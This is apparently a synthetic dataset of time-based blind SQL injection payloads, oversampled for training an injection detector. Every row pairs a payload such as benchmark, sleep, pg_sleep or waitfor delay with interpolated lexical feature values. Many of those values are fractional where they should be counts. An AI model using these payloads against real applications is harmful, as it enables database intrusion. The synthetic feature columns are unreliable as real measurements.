id,label,payload_type,payload,retrieval_method,retrieval_source_id,retrieval_distance,length,num_unique_chars,entropy,alpha_count,digit_count,space_count,punct_count,alpha_ratio,digit_ratio,space_ratio,punct_ratio,single_quote_count,double_quote_count,dash_count,slash_count,star_count,equals_count,semicolon_count,paren_count,percent_count,underscore_count,comma_count,operator_count,has_single_quote,has_double_quote,has_comment_dashdash,has_comment_hash,has_comment_block,has_equal,has_parentheses,has_semicolon,has_percent_encoding,has_hex_literal,has_concat_operator,kw_select,kw_union,kw_where,kw_from,kw_and,kw_or,kw_insert,kw_update,kw_delete,kw_drop,kw_create,kw_alter,kw_sleep,kw_benchmark,kw_waitfor,kw_delay,kw_information_schema,kw_table,kw_column,kw_database,kw_cast,kw_convert,kw_concat,kw_substr,kw_substring,kw_ascii,kw_char,kw_load_file,kw_outfile,kw_exec,kw_order,kw_by,kw_exists,kw_case,kw_when,keyword_total
SMOTE_000011,attack,time,"select benchmark  (  5000000,md5  (  0x4c4d6142   )    )    and '%'  =  '",nearest_attack_euclidean,R000253,0.30691113303967305,73.77375708782513,27.221073453664324,3.8597698564980796,23.88429381465729,15.0,25.0,9.889463273167838,0.32307483483732946,0.20349206227442174,0.33915343712403623,0.1342796657642125,3.0,0.0,0.0,0.0,0.0,1.0,0.0,4.0,0.8894632731678387,0.0,1.0,1.0,1.0,0.0,0.0,0.0,0.0,1.0,1.0,0.0,0.0,0.9999999999999999,0.0,1.0,0.0,0.0,0.0,1.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,1.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,3.0
SMOTE_000012,attack,time,"1%' or 8514  =  benchmark  (  5000000,md5  (  0x544d5a4c   )    )   #",nearest_attack_euclidean,R000166,0.08853952211319592,69.41645648394194,25.0,3.70400558069173,17.0,19.0,24.333165187153554,9.083291296788389,0.24499025455796847,0.27381263744714124,0.3503708269289049,0.13082628106598537,1.0,0.0,0.0,0.0,0.0,1.0,0.0,4.0832912967883885,1.0,0.0,1.0,1.0,1.0,0.0,0.0,1.0,0.0,1.0,1.0,0.0,0.0,0.9999999999999999,0.0,0.0,0.0,0.0,0.0,0.0,1.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,1.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,2.0
SMOTE_000013,attack,time,1'  )   or 6793  =    (  select 6793 from pg_sleep  (  5   )    ) ,nearest_attack_euclidean,R000282,0.36121885134864407,65.83728099639326,22.837280996393257,3.4033704414622212,19.0,10.0,29.0,7.837280996393257,0.2885994547945287,0.15189444989185721,0.44049390468638594,0.11901219062722818,0.8372809963932564,0.0,0.0,0.0,0.0,1.0,0.0,5.0,0.0,0.9999999999999999,0.0,1.0,0.8372809963932565,0.0,0.0,0.0,0.0,1.0,1.0,0.0,0.0,0.0,0.0,1.0,0.0,0.0,1.0,0.0,1.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,3.0
SMOTE_000014,attack,time,"1""  )   and 2388  =  benchmark  (  5000000,md5  (  0x6d457153   )    )   #",nearest_attack_euclidean,R000089,0.140121700107653,74.07593210496569,27.07593210496568,3.70309785129269,16.0,21.0,28.0,9.07593210496568,0.2159973128505494,0.28349647311634607,0.37799529748846145,0.12251091654464312,0.0,1.0,0.0,0.0,0.0,1.0,0.0,5.0,0.07593210496568095,0.0,1.0,1.0,0.0,1.0,0.0,1.0,0.0,1.0,1.0,0.0,0.0,0.9999999999999999,0.0,0.0,0.0,0.0,0.0,1.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,1.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,2.0
SMOTE_000015,attack,time,"1'+  (  select 'plcm' where 2141  =  2141 and elt  (  3114  =  3114,sleep  (  5   )    )   #",nearest_attack_euclidean,R000132,0.3608177622874601,92.75693935974641,26.25231311991547,3.6050936314519486,26.0,18.0,35.50462623983094,13.252313119915469,0.28042586253844204,0.19414098175738295,0.38264560076234716,0.14278755494182785,3.1261565599577343,0.0,0.0,0.0,0.0,2.0,0.0,5.126156559957734,0.0,0.0,1.0,3.1261565599577343,1.0,0.0,0.0,0.8738434400422654,0.0,1.0,1.0,0.0,0.0,0.0,0.0,1.0,0.0,1.0,0.0,1.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,1.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,4.0
SMOTE_000016,attack,time,1   )    )    as xbii where 2262  =  2262 or sleep  (  5  )  --,nearest_attack_euclidean,R000214,0.0442127028156425,62.94119767293465,21.0,3.237395674666733,18.044101745299017,10.0,27.91179650940197,6.985299418233662,0.28674652995453703,0.1588883570811551,0.44339242541031854,0.11097268755398929,0.0,0.0,2.0,0.0,0.0,1.0,0.0,3.9852994182336614,0.0,0.0,0.0,3.0,0.0,0.0,1.0,0.0,0.0,1.0,1.0,0.0,0.0,0.0,0.0,0.0,0.0,1.0,0.0,0.0,0.9852994182336614,0.0,0.0,0.0,0.0,0.0,0.0,1.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,2.9852994182336614
SMOTE_000017,attack,time,"1%""   )    )    or elt  (  5873  =  5873,sleep  (  5   )    )   #",nearest_attack_euclidean,R000275,1.0603714581223824,65.0,20.0,2.93800609600017,10.0,10.0,34.0,11.0,0.15384615384615385,0.15384615384615385,0.5230769230769231,0.16923076923076924,0.3441938048260478,0.6558061951739521,0.0,0.0,0.0,1.0,0.0,6.0,1.0,0.0,1.0,1.0,0.3441938048260478,0.655806195173952,0.0,1.0,0.0,1.0,1.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,1.0,0.0,0.0,0.0,0.0,0.0,0.0,1.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,2.0
SMOTE_000018,attack,time,"select benchmark  (  5000000,md5  (  0x4c4d6142   )    )    and    (    (   '%'  =  '",nearest_attack_euclidean,R000081,1.265225133459878,90.91569056470183,27.91569056470184,3.609797718098687,26.66276225880736,15.0,37.16861887059632,12.08430943529816,0.29282460390151205,0.1650078069480039,0.40911398144085714,0.13305360770962688,3.0,0.0,0.0,0.0,0.0,1.0,0.0,6.54215471764908,0.5421547176490802,0.0,1.0,1.0,1.0,0.0,0.0,0.0,0.0,1.0,1.0,0.0,0.0,0.9999999999999999,0.0,1.0,0.0,0.0,0.0,1.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,1.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,3.0
SMOTE_000019,attack,time,"1""  )   or 6793  =    (  select 6793 from pg_sleep  (  5   )    )    and   (  ""lsis"" like ""lsis",nearest_attack_euclidean,R000232,0.9138012180339304,94.55548809486574,28.0,3.5915045999115707,32.22195237946296,10.0,39.88902381026852,12.44451190513426,0.34067176716949005,0.10576093158469682,0.42192533328955717,0.131641967956256,0.0,4.0,0.0,0.0,0.0,1.4445119051342603,0.0,6.0,0.0,0.9999999999999999,0.0,1.4445119051342603,0.0,1.0,0.0,0.0,0.0,1.0,1.0,0.0,0.0,0.0,0.0,1.0,0.0,0.0,1.0,1.0,1.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,4.0
SMOTE_000020,attack,time,"1""  )   or 6793  =    (  select 6793 from pg_sleep  (  5   )    )    and   (  ""lsis"" like ""lsis",nearest_attack_euclidean,R000232,1.0220375062981673,95.0,27.382050813551935,3.579250931616566,33.073076220327906,10.0,39.617949186448065,12.308974593224033,0.34813764442450423,0.10526315789473684,0.41703104406787433,0.12956815361288454,0.0,4.0,0.0,0.0,0.0,1.308974593224032,0.0,6.0,0.0,0.9999999999999999,0.0,1.3089745932240322,0.0,1.0,0.0,0.0,0.0,1.0,1.0,0.0,0.0,0.0,0.0,1.0,0.0,0.0,1.0,1.308974593224032,0.691025406775968,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,4.0
SMOTE_000021,attack,time,"1"" where 3990  =  3990 and 8594  =    (  select 8594 from pg_sleep  (  5   )    )   --",nearest_attack_euclidean,R000140,0.5996002645380675,90.41092989559755,30.0,3.790910371938698,27.035813797968103,18.0,35.0358137979681,10.33930229966135,0.29830945962359856,0.19997689239831384,0.3871880784672936,0.11452556951079405,0.0,1.0,2.0,0.0,0.0,2.0,0.0,4.33930229966135,0.0,0.9999999999999999,0.0,4.0,0.0,1.0,1.0,0.0,0.0,1.0,1.0,0.0,0.0,0.0,0.0,1.0,0.0,1.0,1.0,1.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,4.0
SMOTE_000022,attack,time," select sleep  (  5  )   and    (    (   ""rthl"" like ""rthl",nearest_attack_euclidean,R000178,0.8568091055279375,57.608754656616185,18.39124534338382,3.2733137696883183,25.60875465661618,1.3912453433838188,23.217509313232362,7.391245343383819,0.4444888533005801,0.024223676727055457,0.40290545323916777,0.12838201673319669,0.0,3.3912453433838188,0.0,0.0,0.0,0.0,0.0,4.0,0.0,0.0,0.0,2.220446049250313e-16,0.0,1.0,0.0,0.0,0.0,1.1102230246251565e-16,1.0,0.0,0.0,0.0,0.0,0.6087546566161811,0.0,0.0,0.0,1.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,1.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,2.6087546566161812
SMOTE_000023,attack,time,"1  )   where 2044  =  2044 or elt  (  6272  =  6272,sleep  (  5   )    )   --",nearest_attack_euclidean,R000090,0.40718861505369425,75.02182410443723,22.0,3.3397781773328785,15.0,18.0,32.41745928354978,9.604364820887445,0.20015740231483437,0.2401888827778012,0.4317103797407048,0.12794333516665962,0.0,0.0,2.0,0.0,0.0,2.0,0.0,4.6043648208874455,0.0,0.0,1.0,4.0,0.0,0.0,1.0,0.0,0.0,1.0,1.0,0.0,0.0,0.0,0.0,0.0,0.0,1.0,0.0,0.0,1.0,0.0,0.0,0.0,0.0,0.0,0.0,1.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,3.0
SMOTE_000024,attack,time,"1%'  )   or 8514  =  benchmark  (  5000000,md5  (  0x544d5a4c   )    )   #",nearest_attack_euclidean,R000308,0.6577045595358153,73.56763273111483,24.56763273111482,3.5822773787584414,17.0,19.0,28.0,9.567632731114822,0.23110927994952105,0.2582986070024058,0.3806505787403876,0.12994153430768554,0.7838163655574104,0.0,0.0,0.0,0.0,1.0,0.0,5.0,0.7838163655574106,0.0,1.0,1.0,0.7838163655574104,0.0,0.0,1.0,0.0,1.0,1.0,0.0,0.0,0.9999999999999999,0.0,0.0,0.0,0.0,0.0,0.0,1.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,1.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,2.0
SMOTE_000025,attack,time,1  )   as bpap where 7758  =  7758 or 4240  =    (  select 4240 from pg_sleep  (  5   )    )   --,nearest_attack_euclidean,R000264,0.16004593837178427,97.06866822125747,28.0,3.682472016846459,30.0,18.0,39.0,10.068668221257472,0.30906164037053185,0.18543698422231913,0.4017801324816914,0.10372124292545762,0.0,0.06866822125747252,2.0,0.0,0.0,2.0,0.0,5.0,0.0,0.9999999999999999,0.0,4.0,0.0,0.06866822125747252,1.0,0.0,0.0,1.0,1.0,0.0,0.0,0.0,0.0,1.0,0.0,1.0,1.0,0.0,1.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,4.0
SMOTE_000026,attack,time, (  select * from   (  select  (  sleep  (  5   )    )     )  srmq  )  --,nearest_attack_euclidean,R000018,2.0813741828094443,72.52233237927655,17.0,2.8788381131450347,25.0,1.0,36.0,10.522332379276545,0.34473776455823557,0.013789510582329412,0.49642238096385927,0.14505034389557567,0.0,0.0,1.0446647585530897,0.0,1.0,0.0,0.0,8.0,0.0,0.0,0.0,2.0446647585530897,0.0,0.0,0.5223323792765449,0.47766762072345526,0.0,1.1102230246251565e-16,1.0,0.0,0.0,0.0,0.0,2.0,0.0,0.0,1.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,1.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,4.0
SMOTE_000027,attack,time,"1%""   )    )    or sleep  (  5  )   and    (    (   ""%""  =  """,nearest_attack_euclidean,R000240,1.6475466665084808,66.79015738718043,16.638115163301222,2.533983525675535,12.895078693590214,2.0,38.895078693590214,13.0,0.18920549849631652,0.030321414780847183,0.5833838906473297,0.19708919607550657,0.0,4.0,0.0,0.0,0.0,1.0,0.0,6.723769673397554,1.2762303266024464,0.0,0.0,1.0,0.0,1.0,0.0,0.0,0.0,1.0,1.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,1.0,1.0,0.0,0.0,0.0,0.0,0.0,0.0,1.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,3.0
SMOTE_000028,attack,time,"1 where 7158  =  7158 or elt  (  5873  =  5873,sleep  (  5   )    )   #",nearest_attack_euclidean,R000237,1.4194617524068687,73.84089649897345,21.893930999315632,3.327492571883491,15.473482749828907,18.0,31.893930999315632,8.473482749828907,0.20962206470701494,0.24416752570303235,0.4315423826563392,0.11466802693361347,0.0,0.0,0.0,0.0,0.0,2.0,0.0,4.473482749828908,0.0,0.0,1.0,2.0,0.0,0.0,0.0,1.0,0.0,1.0,1.0,0.0,0.0,0.0,0.0,0.0,0.0,1.0,0.0,0.4734827498289078,0.5265172501710922,0.0,0.0,0.0,0.0,0.0,0.0,1.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,3.0
SMOTE_000029,attack,time,1   )    )    as dhqt where 8485  =  8485 waitfor delay '0:0:5'--,nearest_attack_euclidean,R000271,0.7844594942895772,61.59362228429102,25.0,4.022081004032917,23.0,12.0,18.08024767224945,8.513374612041575,0.37462776855737573,0.1954579662038482,0.29171088348172486,0.13820338175705124,2.0,0.0,2.0,0.0,0.0,1.0,0.0,1.5133746120415745,0.0,0.0,0.0,3.0,1.0,0.0,1.0,0.0,0.0,1.0,1.0,0.0,0.0,0.0,0.0,0.0,0.0,1.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,1.0,1.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,3.0
SMOTE_000030,attack,time," select sleep  (  5  )   and    (    (     (  ""uvzc"" like ""uvzc",nearest_attack_euclidean,R000281,0.057085260132172494,62.756997537632486,19.0,3.1838118031995672,26.0,1.0,27.75699753763249,8.0,0.41431594060971716,0.015935228484989128,0.4422670030253807,0.12748182787991297,0.0,3.0,0.0,0.0,0.0,0.0,0.0,5.0,0.0,0.0,0.0,2.220446049250313e-16,0.0,1.0,0.0,0.0,0.0,1.1102230246251565e-16,1.0,0.0,0.0,0.0,0.0,1.0,0.0,0.0,0.0,1.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,1.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,3.0
SMOTE_000031,attack,time,"1%"" rlike   (  select * from   (  select  (  sleep  (  5   )    )     )  vwyq  )  #",nearest_attack_euclidean,R000072,0.492271345899405,85.26166543392864,24.858645910379458,3.1879224098328014,30.0,2.0,40.978957254687565,12.28270817924108,0.353188516122933,0.023545901074862208,0.47913453817887924,0.14413104462332554,0.0,1.0,0.0,0.0,1.0,0.0,0.0,8.42406226886162,0.8586459103794599,0.0,0.0,1.0,0.0,1.0,0.0,1.0,0.0,1.1102230246251565e-16,1.0,0.0,0.0,0.0,0.0,2.0,0.0,0.0,1.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,1.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,4.0
